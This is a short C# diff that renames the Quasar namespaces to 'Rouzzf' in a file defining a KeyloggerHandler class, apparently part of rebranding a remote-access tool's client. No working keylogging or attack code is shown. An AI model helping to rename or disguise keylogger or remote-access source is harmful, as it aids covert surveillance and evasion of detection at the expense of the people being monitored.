@@ -1,8 +1,8 @@
-﻿using Quasar.Client.Config;
-using Quasar.Common.Messages;
-using Quasar.Common.Networking;
+﻿using Rouzzf.Client.Config;
+using Rouzzf.Common.Messages;
+using Rouzzf.Common.Networking;
 
-namespace Quasar.Client.Messages
+namespace Rouzzf.Client.Messages
 {
     public class KeyloggerHandler : IMessageProcessor
     {
